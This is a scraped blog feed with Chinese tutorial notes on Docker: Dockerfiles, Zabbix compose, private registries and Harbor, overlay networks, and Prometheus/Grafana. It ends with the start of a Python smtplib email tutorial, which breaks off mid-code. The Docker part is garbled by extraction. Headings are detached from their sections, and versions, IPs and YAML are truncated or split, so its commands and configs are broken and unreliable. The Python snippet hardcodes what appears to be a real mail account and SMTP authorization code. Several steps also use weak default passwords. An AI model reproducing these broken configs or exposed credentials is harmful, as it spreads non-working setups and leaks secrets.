class="code"><pre><span class="line">FROM centos:6.</span><br><span class="line">RUN echo &#x27;192.168.19.200 mirrors.aliyun.com&#x27;</span><br><span class="line">&gt;&gt;/etc/hosts</span><br><span class="line">RUN curl -o /etc/yum.repos.d/CentOS-Base.repo</span><br><span class="line">http://mirrors.aliyun.com/repo/Centos-6.repo</span><br><span class="line">RUN curl -o /etc/yum.repos.d/epel.repo</span><br><span class="line">http://mirrors.aliyun.com/repo/epel-6.repo</span><br><span class="line">RUN yum install nginx -y</span><br><span class="line">CMD [&quot;nginx&quot;,&quot;-g&quot;,&quot;daemon off;&quot;]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">FROM centos6.9_nginx:v</span><br><span class="line">RUN yum install php-fpm php-gd php-mbstring -</span><br><span class="line">y</span><br><span class="line">ADD http://www.conf /etc/php-fpm.d/www.conf</span><br><span class="line">ADD default.conf</span><br><span class="line">/etc/nginx/conf.d/default.conf</span><br><span class="line">RUN mkdir /html</span><br><span class="line">WORKDIR /html</span><br><span class="line">RUN curl -o kodexplorer4.40.zip</span><br><span class="line">http://192.168.19.200/191127/kodexplorer4.40.</span><br><span class="line">zip</span><br><span class="line">RUN yum install unzip -y</span><br><span class="line">RUN unzip kodexplorer4.40.zip</span><br><span class="line">RUN chown -R nginx:nginx.</span><br><span class="line">ADD init.sh /init.sh</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CMD [&quot;/bin/bash&quot;,&quot;/init.sh&quot;]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /init.sh</span><br></pre></td></tr></table></figure><h2 id="dockerfile使用环境变量的例子："><a href="#dockerfile使用环境变量的例子：" class="headerlink" title="dockerfile使用环境变量的例子："></a>dockerfile使用环境变量的例子：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">service php-fpm start</span><br><span class="line">nginx -g &#x27;daemon off;&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">FROM centos:</span><br><span class="line">RUN curl -o /etc/yum.repos.d/CentOS-Base.repo</span><br><span class="line">http://mirrors.aliyun.com/repo/Centos-7.repo</span><br><span class="line">RUN curl -o /etc/yum.repos.d/epel.repo</span><br><span class="line">http://mirrors.aliyun.com/repo/epel-7.repo</span><br><span class="line">RUN yum install nginx openssh-server</span><br><span class="line">initscripts -y</span><br><span class="line">RUN /usr/sbin/sshd-keygen</span><br><span class="line">ADD init.sh /init.sh</span><br><span class="line">ENTRYPOINT [&quot;/bin/bash&quot;,&quot;/init.sh&quot;]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vi init.sh</span><br><span class="line">#!/bin/bash</span><br><span class="line">if [ -z $SSH_PWD ];then</span><br><span class="line">SSH_PWD=$</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo $SSH_PWD|passwd --stdin root</span><br><span class="line">nginx</span><br><span class="line">/usr/sbin/sshd -D</span><br></pre></td></tr></table></figure><h1 id="0-1-11-docker镜像的分层-复用"><a href="#0-1-11-docker镜像的分层-复用" class="headerlink" title="0. 1 11:docker镜像的分层(复用,"></a>0. 1 11:docker镜像的分层(复用,</h1><h1 id="节省空间"><a href="#节省空间" class="headerlink" title="节省空间)"></a>节省空间)</h1><h1 id="0-1-12-dockerfile的优化"><a href="#0-1-12-dockerfile的优化" class="headerlink" title="0. 1 12:dockerfile的优化"></a>0. 1 12:dockerfile的优化</h1><h1 id="0-1-13-容器间的互联"><a href="#0-1-13-容器间的互联" class="headerlink" title="0. 1 13:容器间的互联"></a>0. 1 13:容器间的互联</h1><h2 id="docker-run-–link-正在运行容器的名字"><a href="#docker-run-–link-正在运行容器的名字" class="headerlink" title="docker run –link 正在运行容器的名字"></a>docker run –link 正在运行容器的名字</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a: 使用体积小的镜像alpine</span><br><span class="line">b：尽可能的清理无用的缓存文件</span><br><span class="line">c：修改dockerfile的时候，尽可能把修改的内容放在</span><br><span class="line">最后</span><br><span class="line">d：使用.dockerignore忽略构建docker镜像时，不需</span><br><span class="line">要的文件</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">docker run --name mysql-server -t \</span><br><span class="line">-e MYSQL_DATABASE=&quot;zabbix&quot; \</span><br><span class="line">-e MYSQL_USER=&quot;zabbix&quot; \</span><br><span class="line">-e MYSQL_PASSWORD=&quot;zabbix_pwd&quot; \</span><br><span class="line">-e MYSQL_ROOT_PASSWORD=&quot;root_pwd&quot; \</span><br><span class="line">-d mysql:5.7 \</span><br><span class="line">--character-set-server=utf8 --collation-server=utf8_bin</span><br></pre></td></tr></table></figure><p>docker run –name zabbix-java-gateway -t<br>-d zabbix&#x2F;zabbix-java-gateway:latest</p><p>docker run –name zabbix-server-mysql -t<br>-e DB_SERVER_HOST&#x3D;”mysql-server”<br>-e MYSQL_DATABASE&#x3D;”zabbix”<br>-e MYSQL_USER&#x3D;”zabbix”<br>-e MYSQL_PASSWORD&#x3D;”zabbix_pwd”<br>-e MYSQL_ROOT_PASSWORD&#x3D;”root_pwd”<br>-e ZBX_JAVAGATEWAY&#x3D;”zabbix-java-gateway”<br>--link mysql-server:mysql<br>--link zabbix-java-gateway:zabbix-java-gateway<br>-p 10051:10051<br>-d zabbix&#x2F;zabbix-server-mysql:latest</p><p>docker run –name zabbix-web-nginx-mysql -t<br>-e DB_SERVER_HOST&#x3D;”mysql-server”<br>-e MYSQL_DATABASE&#x3D;”zabbix”<br>-e MYSQL_USER&#x3D;”zabbix”<br>-e MYSQL_PASSWORD&#x3D;”zabbix_pwd”<br>-e MYSQL_ROOT_PASSWORD&#x3D;”root_pwd”<br>--link mysql-server:mysql<br>--link zabbix-server-mysql:zabbix-server<br>-p 80:80<br>-d zabbix&#x2F;zabbix-web-nginx-mysql:latest</p><h1 id="0-1-14-单机版的容器编排"><a href="#0-1-14-单机版的容器编排" class="headerlink" title="0. 1 14:单机版的容器编排"></a>0. 1 14:单机版的容器编排</h1><h2 id="yum-install-docker-compose-y-需要epel源"><a href="#yum-install-docker-compose-y-需要epel源" class="headerlink" title="yum install docker-compose -y(需要epel源)"></a>yum install docker-compose -y(需要epel源)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">version: &#x27;3&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">services:</span><br><span class="line">mysql-server:</span><br><span class="line">image: mysql:5.</span><br><span class="line">restart: always</span><br><span class="line">environment:</span><br><span class="line">MYSQL_ROOT_PASSWORD: root_pwd</span><br><span class="line">MYSQL_DATABASE: zabbix</span><br><span class="line">MYSQL_USER: zabbix</span><br><span class="line">MYSQL_PASSWORD: zabbix_pwd</span><br><span class="line">command: --character-set-server=utf</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">zabbix-java-gateway:</span><br><span class="line">image: zabbix/zabbix-java-gateway:latest</span><br><span class="line">restart: always</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zabbix-server:</span><br><span class="line">depends_on:</span><br></pre></td></tr></table></figure><ul><li>mysql-server<br>image: zabbix&#x2F;zabbix-server-mysql:latest<br>restart: always<br>environment:<br>DB_SERVER_HOST: mysql-server<br>MYSQL_DATABASE: zabbix<br>MYSQL_USER: zabbix</li></ul><h2 id="docker-compose-up-d-启动服务"><a href="#docker-compose-up-d-启动服务" class="headerlink" title="docker-compose up -d 启动服务"></a>docker-compose up -d 启动服务</h2><h2 id="docker-compose-down-停止服务"><a href="#docker-compose-down-停止服务" class="headerlink" title="docker-compose down 停止服务"></a>docker-compose down 停止服务</h2><h1 id="0-1-15-私有仓库docker-registry"><a href="#0-1-15-私有仓库docker-registry" class="headerlink" title="0. 1 15:私有仓库docker-registry"></a>0. 1 15:私有仓库docker-registry</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">MYSQL_PASSWORD: zabbix_pwd</span><br><span class="line">MYSQL_ROOT_PASSWORD: root_pwd</span><br><span class="line">ZBX_JAVAGATEWAY: zabbix-java-gateway</span><br><span class="line">ports:</span><br></pre></td></tr></table></figure><ul><li>“10051:10051”</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zabbix-web-nginx-mysql:</span><br><span class="line">depends_on:</span><br></pre></td></tr></table></figure><ul><li>zabbix-server<br>image: zabbix&#x2F;zabbix-web-nginx-<br>mysql:latest<br>ports:</li><li>“80:80”<br>restart: always<br>environment:<br>DB_SERVER_HOST: mysql-server<br>MYSQL_DATABASE: zabbix<br>MYSQL_USER: zabbix<br>MYSQL_PASSWORD: zabbix_pwd<br>MYSQL_ROOT_PASSWORD: root_pwd</li></ul><h3 id="启动私有仓库"><a href="#启动私有仓库" class="headerlink" title="#启动私有仓库"></a>#启动私有仓库</h3><p>docker run -d -p 5000 :5000 –restart&#x3D;always –name registry -v &#x2F;opt&#x2F;myregistry:&#x2F;var&#x2F;lib&#x2F;registry registry</p><h1 id="镜像地址"><a href="#镜像地址" class="headerlink" title="镜像地址"></a>镜像地址</h1><p>nginx:1.15 官方仓库的官方镜像<br>nginx&#x2F;nginx:1.15 官方仓库的用户镜像</p><p>daocloud.io&#x2F;nginx&#x2F;nginx:1.15 私有仓库的镜像</p><h1 id="上传镜像"><a href="#上传镜像" class="headerlink" title="上传镜像"></a>上传镜像</h1><p>docker tag alpine:3.<br>10 .0.0.11:5000&#x2F;alpine:3.<br>docker image push 10 .0.0.11:5000&#x2F;alpine:3.</p><h1 id="第一次上传镜像会报错"><a href="#第一次上传镜像会报错" class="headerlink" title="第一次上传镜像会报错"></a>第一次上传镜像会报错</h1><p>vim &#x2F;etc&#x2F;docker&#x2F;daemon.json<br>{<br>“insecure-registries”: [“10.0.0.11:5000”]<br>}</p><p>systemctl restart docker</p><p>docker image push 10 .0.0.11:5000&#x2F;alpine:3.</p><h3 id="下载镜像"><a href="#下载镜像" class="headerlink" title="#下载镜像"></a>#下载镜像</h3><p>docker image pull 10 .0.0.11:5000&#x2F;alpine:3.</p><h1 id="0-1-16-企业级私有仓库"><a href="#0-1-16-企业级私有仓库" class="headerlink" title="0. 1 16: 企业级私有仓库"></a>0. 1 16: 企业级私有仓库</h1><h1 id="harbor-docker-compose"><a href="#harbor-docker-compose" class="headerlink" title="harbor(docker-compose)"></a>harbor(docker-compose)</h1><h2 id="为harbor配置https证书"><a href="#为harbor配置https证书" class="headerlink" title="为harbor配置https证书"></a>为harbor配置https证书</h2><h3 id="下载安装器"><a href="#下载安装器" class="headerlink" title="#下载安装器"></a>#下载安装器</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/goharbor/harbor/releases/d</span><br><span class="line">ownload/v1.10.0/harbor-offline-installer-</span><br><span class="line">v1.10.0.tgz</span><br><span class="line">#解压</span><br><span class="line">[root@docker01 opt]# tar xf harbor-offline-</span><br><span class="line">installer-v1.8.0.tgz</span><br><span class="line">#修改配置文件</span><br><span class="line">cd harbor</span><br><span class="line">vim harbor.yml</span><br><span class="line">hostname: 10 .0.0.</span><br><span class="line">harbor_admin_password: 123456</span><br><span class="line">#执行安装脚本</span><br><span class="line">./install.sh</span><br></pre></td></tr></table></figure><h1 id="0-1-17-docker基础网络"><a href="#0-1-17-docker基础网络" class="headerlink" title="0. 1 17:docker基础网络"></a>0. 1 17:docker基础网络</h1><h2 id="四种基础网络类型"><a href="#四种基础网络类型" class="headerlink" title="四种基础网络类型"></a>四种基础网络类型</h2><h2 id="创建自定义网络"><a href="#创建自定义网络" class="headerlink" title="创建自定义网络"></a>创建自定义网络</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#修改harbor.yml</span><br><span class="line">#配置域名</span><br><span class="line">hostname: blog.oldqiang.com</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#配置证书</span><br><span class="line">https:</span><br><span class="line">port: 443</span><br><span class="line">certificate:</span><br><span class="line">/opt/certs/nginx/1_blog.oldqiang.com_bundle.c</span><br><span class="line">rt</span><br><span class="line">private_key:</span><br><span class="line">/opt/certs/nginx/2_blog.oldqiang.com.key</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#重新执行安装脚本</span><br><span class="line">./install.sh</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bridge 默认类型 NAT模式</span><br><span class="line">host h</span><br></pre></td></tr></table></figure><h1 id="0-1-18-跨宿主机容器间的通讯"><a href="#0-1-18-跨宿主机容器间的通讯" class="headerlink" title="0. 1 18:跨宿主机容器间的通讯"></a>0. 1 18:跨宿主机容器间的通讯</h1><h1 id="之macvlan"><a href="#之macvlan" class="headerlink" title="之macvlan"></a>之macvlan</h1><h1 id="0-1-19-跨宿主机容器间的通讯"><a href="#0-1-19-跨宿主机容器间的通讯" class="headerlink" title="0. 1 19:跨宿主机容器间的通讯"></a>0. 1 19:跨宿主机容器间的通讯</h1><h1 id="之overlay"><a href="#之overlay" class="headerlink" title="之overlay"></a>之overlay</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker network create -d bridge --subnet</span><br><span class="line">172 .18.0.0/16 --gateway 172 .18.0.1 oldqiang</span><br></pre></td></tr></table></figure><h3 id="创建网络"><a href="#创建网络" class="headerlink" title="#创建网络"></a>#创建网络</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker network create -d macvlan --subnet</span><br><span class="line">10 .0.0.0/24 --gateway 10 .0.0.254 -o</span><br><span class="line">parent=eth0 macvlan_1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#启动容器</span><br><span class="line">docker run -it --network macvlan_1 --ip</span><br><span class="line">10 .0.0.105 alpine:3.9</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker03上： consul存储ip地址的分配</span><br><span class="line">docker run --restart=always -d -p 8500 :8500 -</span><br><span class="line">h consul --name consul progrium/consul -</span><br><span class="line">server -bootstrap</span><br></pre></td></tr></table></figure><h1 id="0-1-20-docker容器的监控"><a href="#0-1-20-docker容器的监控" class="headerlink" title="0. 1 20:docker容器的监控"></a>0. 1 20:docker容器的监控</h1><p>docker01、 02 上：<br>vim &#x2F;etc&#x2F;docker&#x2F;daemon.json<br>{<br>“cluster-store”: “consul:&#x2F;&#x2F;10.0.0.13:8500”,<br>“cluster-advertise”: “10.0.0.11:2376”<br>}</p><p>vim &#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;docker.service<br>systemctl daemon-reload<br>systemctl restart docker</p><p>2 ）创建overlay网络<br>docker network create -d overlay –subnet<br>172 .20.2.0&#x2F;24 –gateway 172 .20.2.254 ol1</p><p>3 ）启动容器测试</p><p>docker run -it –network ol1 –name oldboy01<br>alpine:3.9 &#x2F;bin&#x2F;sh<br>每个容器有两块网卡,eth0实现容器间的通讯,eth1实现<br>容器访问外网</p><h3 id="客户端节点"><a href="#客户端节点" class="headerlink" title="#客户端节点"></a>#客户端节点</h3><h1 id="启动node-exporter"><a href="#启动node-exporter" class="headerlink" title="启动node-exporter"></a>启动node-exporter</h1><p>docker run -d -p 9100 :9100 -v<br>“&#x2F;:&#x2F;host:ro,rslave” –name&#x3D;node_exporter<br>quay.io&#x2F;prometheus&#x2F;node-exporter –<br>path.rootfs &#x2F;host</p><h1 id="启动cadvisor"><a href="#启动cadvisor" class="headerlink" title="启动cadvisor"></a>启动cadvisor</h1><p>docker run –volume&#x3D;&#x2F;:&#x2F;rootfs:ro –<br>volume&#x3D;&#x2F;var&#x2F;run:&#x2F;var&#x2F;run:rw –<br>volume&#x3D;&#x2F;sys:&#x2F;sys:ro –<br>volume&#x3D;&#x2F;var&#x2F;lib&#x2F;docker&#x2F;:&#x2F;var&#x2F;lib&#x2F;docker:ro -<br>-publish&#x3D; 8080 :8080 –detach&#x3D;true –<br>name&#x3D;cadvisor google&#x2F;cadvisor:latest</p><h1 id="prometheus节点"><a href="#prometheus节点" class="headerlink" title="prometheus节点"></a>prometheus节点</h1><p>安装prometheus和grafana<br>tar xf prometheus-2.12.0.linux-amd64.tar.gz</p><p>cd prometheus-2.12.0.linux-amd64&#x2F;</p><p>vim prometheus.yml<br>scrape_configs:</p><ul><li><p>job_name: ‘prometheus’<br>static_configs:</p></li><li><p>targets: [‘localhost:9090’]</p></li><li><p>job_name: ‘cadvisor’<br>static_configs:</p></li><li><p>targets:<br>[‘10.0.0.11:8080’,’10.0.0.12:8080’]</p></li><li><p>job_name: ‘node_exporter’<br>static_configs:</p></li><li><p>targets:<br>[‘10.0.0.11:9100’,’10.0.0.12:9100’]</p></li></ul><p>.&#x2F;prometheus –config.file&#x3D;”prometheus.yml”</p><h1 id="安装grafana"><a href="#安装grafana" class="headerlink" title="安装grafana"></a>安装grafana</h1><p>yum localinstall grafana-6.3.3-1.x86_64.rpm -<br>y<br>systemctl start grafana-server.service<br>systemctl enable grafana-server.service</p><h1 id="访问grafana-http-IP-3000，默认账号"><a href="#访问grafana-http-IP-3000，默认账号" class="headerlink" title="访问grafana http://IP:3000，默认账号"></a>访问grafana <a href="http://IP:3000%EF%BC%8C%E9%BB%98%E8%AE%A4%E8%B4%A6%E5%8F%B7">http://IP:3000，默认账号</a></h1><p>admin:admin<br>新建数据源–导入dashboard模板</p>]]></content>
      
      
      <categories>
          
          <category> 技术教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 服务 </tag>
            
            <tag> 架构 </tag>
            
            <tag> 账号 </tag>
            
            <tag> 网盘 </tag>
            
            <tag> 方法 </tag>
            
            <tag> 文件 </tag>
            
            <tag> run </tag>
            
            <tag> o </tag>
            
            <tag> 指令 </tag>
            
            <tag> 容器 </tag>
            
            <tag> docker </tag>
            
            <tag> consul </tag>
            
            <tag> 标签 </tag>
            
            <tag> zip </tag>
            
            <tag> 镜像 </tag>
            
            <tag> nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python发送邮件</title>
      <link href="/posts/76dd1b500ee9/"/>
      <url>/posts/76dd1b500ee9/</url>
      
        <content type="html"><![CDATA[<p>目录</p><ul><li>Python发送邮件<ul><li>一、 文本信息</li><li>二、 图片信息</li><li>三、 附件</li></ul></li></ul><h1 id="Python发送邮件"><a href="#Python发送邮件" class="headerlink" title="Python发送邮件"></a>Python发送邮件</h1><p><a href="https://docs.python.org/3.10/library/smtplib.html">smtplib</a> 是 Python 用来发送邮件的模块，<a href="https://docs.python.org/3.10/library/email.html">email</a> 是用来处理邮件消息</p><p>这里，我们使用<a href="https://blog.csdn.net/qq_62789540/article/details/124513178?spm=1001.2014.3001.5501">装饰器</a>来制作发送邮件的功能</p><h2 id="一、-文本信息"><a href="#一、-文本信息" class="headerlink" title="一、 文本信息"></a>一、 文本信息</h2><p>我们使用<code>MIMEText</code>来发送文本信息</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="comment"># @author: A.L.Kun</span></span><br><span class="line"><span class="comment"># @file : mail.py</span></span><br><span class="line"><span class="comment"># @time : 2022/5/7 16:48</span></span><br><span class="line"><span class="keyword">from</span> smtplib <span class="keyword">import</span> SMTP</span><br><span class="line"><span class="keyword">from</span> email.mime.text <span class="keyword">import</span> MIMEText  <span class="comment"># 发送文本信息使用的库</span></span><br><span class="line"><span class="keyword">from</span> email.header <span class="keyword">import</span> Header  <span class="comment"># 设置请求的头部信息</span></span><br><span class="line"><span class="keyword">from</span> email.utils <span class="keyword">import</span> formataddr  <span class="comment"># 格式化</span></span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps</span><br><span class="line"></span><br><span class="line">receivers = [<span class="string">&#x27;a.l.kun@qq.com&#x27;</span>,]  <span class="comment"># 接收者为可迭代对象，可以实现邮件的群发</span></span><br><span class="line">subject = <span class="string">&#x27;测试邮件&#x27;</span>  <span class="comment"># 设置邮件的标题</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decorate</span>(<span class="params">fun_</span>):</span><br><span class="line">    </span><br><span class="line">    username = <span class="string">&#x27;3500515050@qq.com&#x27;</span>  <span class="comment"># 发送邮件的qq号</span></span><br><span class="line">    password_pass = <span class="string">&#x27;meryyupicqjjciei&#x27;</span>  <span class="comment"># 授权密码，有的邮箱是使用登录密码</span></span><br><span class="line">    smtp = SMTP(<span class="string">&#x27;smtp.qq.com&#x27;</span>)  <span class="comment"># 创建一个SMTP服务器，这里使用qq邮箱</span></span><br><span class="line">    smtp.login(username, password_pass)  <span class="comment"># 登录</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">    @wraps(<span class="params">fun_</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">func_mail</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        fun_(smtp, username, *args, **kwargs)  <span class="comment"># 调用发邮件的函数</span></span><br><span class="line">        smtp.quit()  <span class="comment"># 关闭服务器</span></span><br><span class="line">        smtp.close()  </span><br><span class="line">    <span class="keyword">return</span> func_mail</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@decorate</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mail</span>(<span class="params">smtp, username</span>):</span><br><span class="line">    <span class="keyword">for</span> receiver_ <span class="keyword">in</span> receivers:</span><br><span class="line">        msgRoot = MIMEText(<span class="string">f&quot;这是一个测试邮件，不要回复哦~~~&quot;</span>, <span class="string">&quot;html&quot;</span>, <span class="string">&quot;utf-8&quot;</span>)  <span class="comment"># 如果第二个参数为plain，则是发送纯文本信息，如果邮件有中文，就要使用utf-8</span></span><br><span class="line">        msgRoot[<span class="string">&quot;Subject&quot;</span>] = Header(subject, <span class="string">&quot;utf-8&quot;</span>)  <span class="comment"># 设置文本标题</span></span><br><span class="line">        msgRoot[<span class="string">&#x27;From&#x27;</span>] = formataddr((<span class="string">&quot;A.L.Kun&quot;</span>, username))  <span class="comment"># 设置发件人信息</span></span><br><span class="line">        msgRoot[<span class="string">&#x27;To&#x27;</span>] = formataddr((receiver_.split(<span class="string">&quot;@&quot;</span>)[<span class="number">0</span>], receiver_))  <span class="comment"># 设置收件人信息</span></span><br><span class="line">        smtp.sendmail(username, receiver_, msgRoot.as_string())  <span class="comment"># 发送邮件</span></span><br><span class="line">        <span class="comment"># smtp.set_debuglevel(1)  # 输出调试信息</span></span><br><span class="line">        <span class="built_in">print</span>(receiver_.split(<span class="string">&quot;@&quot;</span>)[<span class="number">0</span>], <span class="string">&#x27;:发送完成&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    mail()</span><br></pre></td></tr></table></figure><blockquote><p>使用装饰器的好处，可以动态创建一个发送邮件的对象，同时可以不用关注邮件的配置，只要关注邮件的内容</p></blockquote><h2 id="二、-图片信息"><a href="#二、-图片信息" class="headerlink" title="二、 图片信息"></a>二、 图片信息</h2><p>我们可以使用<code>MIMEImage</code>来读取图片数据，然后进行发送</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="comment"># @author: A.L.Kun</span></span><br><span class="line"><span class="comment"># @file : mail.py</span></span><br><span class="line"><span class="comment"># @time : 2022/5/7 16:48</span></span><br><span class="line"><span class="keyword">from</span> smtplib <span 